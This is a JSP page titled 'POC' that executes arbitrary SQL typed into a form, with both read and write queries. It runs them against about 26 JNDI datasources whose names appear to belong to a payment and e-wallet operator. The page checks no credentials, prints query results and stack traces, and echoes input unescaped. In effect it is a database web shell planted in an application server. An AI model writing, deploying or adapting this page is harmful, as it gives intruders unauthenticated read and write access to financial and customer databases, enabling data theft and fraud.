<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.sql.*, javax.sql.*, javax.naming.*, javax.rmi.*" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<style>
H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#5670F4;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#5670F4;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#5670F4;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#5670F4;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #5670F4;}  table {
    width: 100%;
  }
</style>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>POC</title>
</head>
<body>
<form method=POST action="poc.jsp">
<table border=0>
 <tr>
	<td align=center>
	<TEXTAREA NAME="dbms" COLS=150 ROWS=18><%= request.getParameter("dbms") %></TEXTAREA>
	</td>
 </tr>
 <tr>
   <td colspan=3 align=center>
   	<select name="jdbc">
		<option value='jdbc/truemoney' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/truemoney")?"selected":"") %>>jdbc/truemoney</option>
		<option value='jdbc/tmxweb' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/tmxweb")?"selected":"") %>>jdbc/tmxweb</option>
		<option value='jdbc/cpggame' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/cpggame")?"selected":"") %>>jdbc/cpggame</option>
		<option value='jdbc/ussdpx' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/ussdpx")?"selected":"") %>>jdbc/ussdpx</option>
		<option value='jdbc/tmnpx' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/tmnpx")?"selected":"") %>>jdbc/tmnpx</option>
		<option value='jdbc/kioskpx' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/kioskpx")?"selected":"") %>>jdbc/kioskpx</option>
		<option value='jdbc/umarket' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/umarket")?"selected":"") %>>jdbc/umarket</option>
		<option value='jdbc/niewsoap_umarket' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/niewsoap_umarket")?"selected":"") %>>jdbc/niewsoap_umarket</option>
		<option value='jdbc/mepay' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/mepay")?"selected":"") %>>jdbc/mepay</option>
		<option value='jdbc/migrate_ewallet' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/migrate_ewallet")?"selected":"") %>>jdbc/migrate_ewallet</option>
		<option value='jdbc/ewpoint_uplugin' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/ewpoint_uplugin")?"selected":"") %>>jdbc/ewpoint_uplugin</option>
		<option value='jdbc/ewpoint_web' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/ewpoint_web")?"selected":"") %>>jdbc/ewpoint_web</option>
		<option value='jdbc/ewpoint' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/ewpoint")?"selected":"") %>>jdbc/ewpoint</option>
		<option value='jdbc/simpassstk' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/simpassstk")?"selected":"") %>>jdbc/simpassstk</option>
		<option value='jdbc/niewsoap_uplugin' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/niewsoap_uplugin")?"selected":"") %>>jdbc/niewsoap_uplugin</option>
		<option value='jdbc/niewsoap' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/niewsoap")?"selected":"") %>>jdbc/niewsoap</option>
		<option value='jdbc/ewpvs_uplugin' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/ewpvs_uplugin")?"selected":"") %>>jdbc/ewpvs_uplugin</option>
		<option value='jdbc/ewpvs_web' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/ewpvs_web")?"selected":"") %>>jdbc/ewpvs_web</option>
		<option value='jdbc/ewpvs' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/ewpvs")?"selected":"") %>>jdbc/ewpvs</option>
		<option value='jdbc/iew' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/iew")?"selected":"") %>>jdbc/iew</option>
		<option value='jdbc/true_corp/mgw' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/true_corp/mgw")?"selected":"") %>>jdbc/true_corp/mgw</option>
		<option value='jdbc/payment_uat' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/payment_uat")?"selected":"") %>>jdbc/payment_uat</option>
		<option value='jdbc/iewreport' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/iewreport")?"selected":"") %>>jdbc/iewreport</option>
		<option value='jdbc/cpg711' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/cpg711")?"selected":"") %>>jdbc/cpg711</option>
		<option value='jdbc/twp_check_ew' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/twp_check_ew")?"selected":"") %>>jdbc/twp_check_ew</option>
		<option value='jdbc/kims' <%= request.getParameter("jdbc")==null?"":(request.getParameter("jdbc").trim().equalsIgnoreCase("jdbc/kims")?"selected":"") %>>jdbc/kims</option>
	</select>
	<select name="rw">
		<option value='r' selected>Read</option>
		<option value='w'>Write</option>
	</select>
   	<input type=submit name=submit value="submit">
   </td>
 </tr>
</table>
</form>
<% 
if(request.getParameter("submit")!=null) {
	if( (request.getParameter("rw")==null) 
		|| (!request.getParameter("rw").trim().equalsIgnoreCase("w")) ) {
		try {
		DataSource ds   = null;
		Connection conn = null;
		Statement stmt	= null;
		ResultSet rs	= null;
		try {
			Context context = new InitialContext();
			Context envCtx	= (Context) context.lookup("java:comp/env");
			Object obj		= (Object) envCtx.lookup(request.getParameter("jdbc"));
			ds	= (DataSource) PortableRemoteObject.narrow(obj, DataSource.class);

			if (ds != null) {
				conn = ds.getConnection();
       	 	} else {
				out.println("<BR>No datasource");
			}
			stmt = conn.createStatement();
			rs   = stmt.executeQuery(request.getParameter("dbms"));
			ResultSetMetaData rsmd	= rs.getMetaData();
			int numberOfColumns		= rsmd.getColumnCount();
%>
			<table border="3" cellspacing="0" cellpadding="3">
			<tr>		
<%			for(int i = 1 ; i <= numberOfColumns ; i++) { %>
	      		<td class="header-center"><small><%= rsmd.getColumnLabel(i)%></small></td>
<%			} %>
			</tr>

<%			int row_count = 0;
			while(rs.next()) { 
				if(++row_count>1000) {
					break;
				} %>
			<tr>		
<%				for(int i = 1 ; i <= numberOfColumns ; i++) { %>
	      		<td class="row-center" bgcolor="#D2F9FE"><small><%= rs.getString(i)%></small></td>
<%				} %>
			</tr>
<%			}
			rs.close();
			rs	 = null;
			stmt.close();
			stmt = null;
			conn.close();
			conn = null;
		} catch(SQLException ex) {
			throw ex;
		} finally {
			if(rs!=null) {
				try{ rs.close(); 	} catch(SQLException exx){;}
			}
			if(stmt!=null) {
				try{ stmt.close(); 	} catch(SQLException exx){;}
			}
			if(conn!=null) {
				try{ conn.close(); 	} catch(SQLException exx){;}
			}
		}
	} catch(Throwable e) {
		try {
			out.println("<BR>Throwable: "+e.toString());
			StackTraceElement[] st = e.getStackTrace();
			for(int i = 0 ; i < st.length ; i++) {
				out.println("<BR>at: "+st[i].toString());
			}
		} catch(Exception ex) { ; }	
	}
	} else {
	try {
		DataSource ds			= null;
		Connection conn			= null;
		PreparedStatement ps 	= null;
		try {
			Context context = new InitialContext();
			Context envCtx	= (Context) context.lookup("java:comp/env");
			Object obj		= (Object) envCtx.lookup(request.getParameter("jdbc"));
			ds	= (DataSource) PortableRemoteObject.narrow(obj, DataSource.class);

			if (ds != null) {
				conn = ds.getConnection();
       	 	} else {
				out.println("<BR>No datasource");
			}
			conn.setAutoCommit(true);
			ps = conn.prepareStatement(request.getParameter("dbms"));
			ps.executeUpdate();
			ps.close();
			ps = null;
			conn.close();
			conn = null;
		} catch(SQLException ex) {
			throw ex;
		} finally {
			if(ps!=null) {
				try{ ps.close(); 	} catch(SQLException exx){;}
			}
			if(conn!=null) {
				try{ conn.close(); 	} catch(SQLException exx){;}
			}
		}
	} catch(Throwable e) {
		try {
			out.println("<BR>Throwable: "+e.toString());
			StackTraceElement[] st = e.getStackTrace();
			for(int i = 0 ; i < st.length ; i++) {
				out.println("<BR>at: "+st[i].toString());
			}
		} catch(Exception ex) { ; }	
	}
	}
}
%>
</body>
</html>